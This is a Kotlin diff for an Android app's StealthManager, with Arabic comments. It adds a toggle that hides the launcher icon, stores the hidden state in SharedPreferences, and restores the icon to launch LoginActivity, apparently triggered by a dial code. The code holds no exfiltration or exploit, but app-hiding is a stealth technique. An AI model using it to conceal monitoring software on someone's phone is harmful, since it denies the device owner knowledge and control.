@@ -6,9 +6,13 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.util.Log
 
+import android.content.Intent
+import android.os.Handler
+import android.os.Looper
+
 /**
  * مدير التخفي
- * يقوم بإخفاء أيقونة التطبيق من القائمة
+ * يقوم بإخفاء أيقونة التطبيق من القائمة وتفعيلها عبر رمز الاتصال
  */
 object StealthManager {
 
@@ -68,13 +72,48 @@ object StealthManager {
      * التحقق مما إذا كانت الأيقونة مخفية
      */
     fun isIconHidden(context: Context): Boolean {
-        return try {
-            val pkg = context.packageManager
-            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
-            val state = pkg.getComponentEnabledSetting(aliasName)
-            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        // We use SharedPreferences as the source of truth for the toggle logic
+        // because setComponentEnabledSetting can be slow to report its new state.
+        return context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
+            .getBoolean("icon_hidden", false)
+    }
+
+    /**
+     * تبديل حالة التخفي (Toggle)
+     */
+    fun toggleStealthMode(context: Context) {
+        val currentlyHidden = isIconHidden(context)
+        Log.i(TAG, "Toggling stealth mode. Currently hidden: $currentlyHidden")
+
+        if (currentlyHidden) {
+            // SHOW: restore alias + register in system
+            showAppIcon(context)
+            // Small delay to let system process the enabling before launching
+            Handler(Looper.getMainLooper()).postDelayed({
+                launchApp(context)
+            }, 500)
+        } else {
+            // HIDE: disable alias
+            hideAppIcon(context)
+        }
+    }
+
+    /**
+     * تشغيل الواجهة الرئيسية (LoginActivity) بأمان
+     */
+    fun launchApp(context: Context) {
+        try {
+            val i = Intent(context, LoginActivity::class.java).apply {
+                addFlags(
+                    Intent.FLAG_ACTIVITY_NEW_TASK or
+                    Intent.FLAG_ACTIVITY_CLEAR_TASK or
+                    Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT
+                )
+            }
+            context.startActivity(i)
+            Log.i(TAG, "LoginActivity launched from StealthManager")
         } catch (e: Exception) {
-            false
+            Log.e(TAG, "launchApp failed: ${e.message}")
         }
     }
 }
